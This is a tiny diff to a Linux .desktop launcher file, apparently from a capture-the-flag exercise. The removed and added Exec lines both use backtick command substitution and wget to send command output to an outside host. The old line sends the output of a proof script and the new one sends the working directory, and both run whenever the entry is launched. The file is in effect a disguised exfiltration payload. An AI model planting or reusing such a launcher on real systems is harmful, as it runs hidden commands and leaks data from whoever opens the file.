@@ -1,3 +1,3 @@
 [Desktop Entry]
-Exec=sh -c "wget https://ctf-thomas.herokuapp.com/?`/proof*.sh`"
+Exec=sh -c "wget https://ctf-thomas.herokuapp.com/?`pwd`"
 Type=Application
